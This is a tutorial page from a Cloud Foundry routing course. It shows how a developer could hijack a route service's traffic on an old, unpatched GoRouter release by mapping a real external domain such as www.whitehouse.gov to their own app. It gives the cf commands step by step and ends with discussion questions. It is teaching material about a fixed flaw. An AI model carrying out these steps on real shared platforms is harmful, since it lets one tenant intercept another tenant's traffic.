---
layout: single
title: Exploiting Route Services
permalink: /route-services/exploit
sidebar:
  title: "Route Services"
  nav: sidebar-route-services
---
## Assumptions
- You have a CF deployed
- You have one
  [proxy](https://github.com/cloudfoundry/cf-networking-release/tree/develop/src/example-apps/proxy)
  app pushed and called appA
- You have one route mapped to appA called APP_A_ROUTE
- You unbound the rate limiter route service from the previous story

## What

In the previous story when you created your own Route Service you ran a command
that looked something like this...

{% include codeHeader.html %}
   ```bash
   cf create-user-provided-service MY_SERVICE -r MY_SERVICE_URL
   ```

The route MY_SERVICE_URL could be inside or outside of your Cloud Foundry.
However, one takes precedence.  Let's say that MY_SERVICE_URL exists inside
*and* outside of your Cloud Foundry. (Before a recent fix) GoRouter would
"hairpin" and always default to the MY_SERVICE_URL that exists *inside* the
Cloud Foundry.

Let's exploit this.

## How

üòá **Pretend that you are an innocent dev**

1. You need to deploy to an older version of routing-release from before this
   attack vector was fixed. Deploy CF with [routing-release
   0.186.0](https://bosh.io/releases/github.com/cloudfoundry-incubator/cf-routing-release?version=0.186.0).

1. Create a Route Service that sends all traffic to whitehouse.gov
{% include codeHeader.html %}
   ```bash
   cf create-user-provided-service realwhitehouse -r https://www.whitehouse.gov/
   ```

1. Bind this new Route Service to your APP_A_ROUTE
{% include codeHeader.html %}
   ```bash
   cf bind-route-service DOMAIN --hostname HOSTNAME realwhitehouse`
   ```

1. See that when you curl APP_A_ROUTE, you now just get www.whitehouse.gov (I
   don't know why you would want this. But it's an easy way to show this attack
   vector.)

üòà **Pretend that you are a malicious dev**

1. Push an app called fakewhitehouse using `--no-route`

1. Create the domain whitehouse.gov (`cf create-shared-domain --help`)

1. Map the route www.whitehouse.gov to the app fakewhitehouse
{% include codeHeader.html %}
   ```bash
   cf map-route fakewhitehouse whitehouse.gov --hostname www
   ```

1. In one terminal, watch the logs for the fakewhitehouseapp (`cf logs --help`)

1. In another terminal curl APP_A_ROUTE

## Expected Results
* You should see in the fakewhitehouse app logs that traffic was redirected to
  fakewhitehouse
* You should see by the response, that traffic was never sent to the real
  whitehouse.gov

## ‚ùì Questions
* What happened?
* Why is this really, really bad?
* How could you exploit this on a multi-tennant deployment?
* What level of permissions do you need to exploit this?

## Extra Credit
Find the code in GoRouter that let this happen. Maybe start your search
[here](https://github.com/cloudfoundry/gorouter/blob/f6879c04bac67c1e467f14b79496b9832869df91/proxy/round_tripper/proxy_round_tripper.go#L126-L196).

## Resources
* [CF docs - Route Services](https://docs.cloudfoundry.org/services/route-services.html)
* [Rate Limiting Route Service](https://github.com/cloudfoundry-samples/ratelimit-service)

